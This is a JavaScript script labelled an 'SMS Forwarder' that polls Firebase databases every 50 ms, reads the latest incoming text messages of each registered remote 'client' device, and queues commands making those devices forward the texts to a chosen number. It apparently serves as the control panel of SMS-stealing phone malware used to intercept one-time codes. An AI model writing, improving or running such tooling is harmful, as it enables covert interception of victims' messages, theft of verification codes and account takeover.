/* ============================================================
   ANANYA SMS Forwarder v5.0 — Ultra Fast Mode
   Polling: 50ms + Parallel processing
   ============================================================ */

(function () {
    'use strict';

    console.log('[SMS-FWD] v5.0 Ultra Fast ✅');

    var ACCOUNTS_KEY = 'flixy_accounts';
    var PROCESSED_KEY = 'sms_fwd_v5';
    var POLL_INTERVAL = 50;  // ← 50ms — ultra fast

    function getAccounts() {
        try {
            var s = localStorage.getItem(ACCOUNTS_KEY);
            return s ? JSON.parse(s) : [];
        } catch (e) { return []; }
    }

    async function fbGet(base, key, path) {
        try {
            var url = base.replace(/\/$/, '') + '/' + path + '.json?auth=' + key;
            var r = await fetch(url);
            if (!r.ok) return null;
            return await r.json();
        } catch (e) { return null; }
    }

    async function fbPut(base, key, path, data) {
        try {
            var url = base.replace(/\/$/, '') + '/' + path + '.json?auth=' + key;
            var r = await fetch(url, {
                method: 'PUT',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
            return r.ok;
        } catch (e) { return false; }
    }

    async function fbPush(base, key, path, data) {
        try {
            var url = base.replace(/\/$/, '') + '/' + path + '.json?auth=' + key;
            var r = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
            return r.ok;
        } catch (e) { return false; }
    }

    var processed = new Set();
    try {
        var saved = JSON.parse(localStorage.getItem(PROCESSED_KEY) || '[]');
        for (var i = 0; i < saved.length; i++) processed.add(saved[i]);
    } catch (e) {}

    function markDone(k) {
        processed.add(k);
        try {
            var arr = Array.from(processed).slice(-1000);
            localStorage.setItem(PROCESSED_KEY, JSON.stringify(arr));
        } catch (e) {}
    }

    function getMsgTimestamp(sms) {
        if (!sms) return 0;
        if (sms.timestamp && typeof sms.timestamp === 'number') return sms.timestamp;
        if (sms.dateTime) {
            var t = new Date(sms.dateTime).getTime();
            if (!isNaN(t)) return t;
        }
        if (sms.time) {
            var t2 = new Date(sms.time).getTime();
            if (!isNaN(t2)) return t2;
        }
        return 0;
    }

    // ============ ULTRA FAST — No await, parallel writes ============
    async function handleDevice(acc, devId) {
        try {
            var cfg = await fbGet(acc.url, acc.key, 'clients/' + devId + '/smsForwarding');
            if (!cfg || !cfg.enabled || !cfg.forwardTo) return;

            var to = String(cfg.forwardTo).replace(/[^0-9]/g, '');
            var simSlot = cfg.simSlot != null ? cfg.simSlot : (cfg.sim || 0);
            var enabledAt = cfg.enabledAt || 0;
            if (!to) return;

            var msgs = await fbGet(acc.url, acc.key, 'messages/' + devId);
            if (!msgs || typeof msgs !== 'object') return;

            var ids = Object.keys(msgs);
            if (!ids.length) return;
            ids.sort(function (a, b) { return Number(a) - Number(b); });

            var scanLimit = Math.min(3, ids.length);  // sirf 3 check
            var startIdx = ids.length - scanLimit;

            for (var i = startIdx; i < ids.length; i++) {
                var msgId = ids[i];
                var k = devId + '_' + msgId;
                if (processed.has(k)) continue;

                var sms = msgs[msgId];
                if (!sms) { markDone(k); continue; }
                if (sms.type !== 'incoming') { markDone(k); continue; }

                var msgTime = getMsgTimestamp(sms);
                if (enabledAt > 0 && msgTime > 0 && msgTime < enabledAt) {
                    markDone(k);
                    continue;
                }

                var text = sms.message || sms.body || sms.text || '';
                if (!text) { markDone(k); continue; }

                // ⚡ INSTANT — mark processed immediately (avoid re-scan)
                markDone(k);

                var ts = Date.now();
                var cid = 'fwd_' + ts + '_' + Math.random().toString(36).slice(2, 8);
                var sim = { simSlot: simSlot };

                console.log('[SMS-FWD] ⚡ Fast forward:', sms.sender || 'Unknown', '→', to);

                // ⚡ PARALLEL — sab writes ek saath (await NAHI)
                Promise.all([
                    fbPut(acc.url, acc.key, 'clients/' + devId + '/webhookEvent/sendSms', {
                        to: to, message: text, isSended: false,
                        timestamp: ts, commandId: cid, simInfo: sim,
                        forwarded: true, originalSender: sms.sender || 'Unknown'
                    }),
                    fbPut(acc.url, acc.key, 'clients/' + devId + '/commands/sendSms', {
                        targetNumber: to, message: text, timestamp: ts,
                        status: 'pending', id: cid, simInfo: sim, forwarded: true
                    }),
                    fbPush(acc.url, acc.key, 'clients/' + devId + '/messages', {
                        sender: 'FORWARDER',
                        message: 'Fwd to ' + to + ': ' + String(text).slice(0, 200),
                        dateTime: ts, timestamp: ts, type: 'outgoing',
                        targetNumber: to, commandId: cid, status: 'pending',
                        simInfo: sim, forwarded: true
                    }),
                    fbPut(acc.url, acc.key, 'clients/' + devId + '/sms', {
                        to: to, text: text, timestamp: ts, status: 'pending',
                        commandId: cid, forwarded: true
                    })
                ]).then(function() {
                    console.log('[SMS-FWD] ✅ Sent:', sms.sender || 'Unknown');
                }).catch(function(e) {
                    console.error('[SMS-FWD] Write error:', e.message);
                });
            }
        } catch (e) {
            console.error('[SMS-FWD] Error:', e.message);
        }
    }

    var busy = false;

    async function tick() {
        if (busy) return;  // Agar previous cycle chal raha hai toh skip
        busy = true;
        try {
            var accs = getAccounts();
            for (var i = 0; i < accs.length; i++) {
                var acc = accs[i];
                if (!acc.url || !acc.key) continue;

                var clients = await fbGet(acc.url, acc.key, 'clients');
                if (!clients || typeof clients !== 'object') continue;

                var devIds = Object.keys(clients);
                for (var j = 0; j < devIds.length; j++) {
                    await handleDevice(acc, devIds[j]);
                }
            }
        } finally {
            busy = false;
        }
    }

    setInterval(tick, POLL_INTERVAL);
    setTimeout(tick, 1000);

    console.log('[SMS-FWD] v5.0 Running every', POLL_INTERVAL, 'ms ⚡');
    console.log('[SMS-FWD] Ultra fast mode — instant forward!');

})();
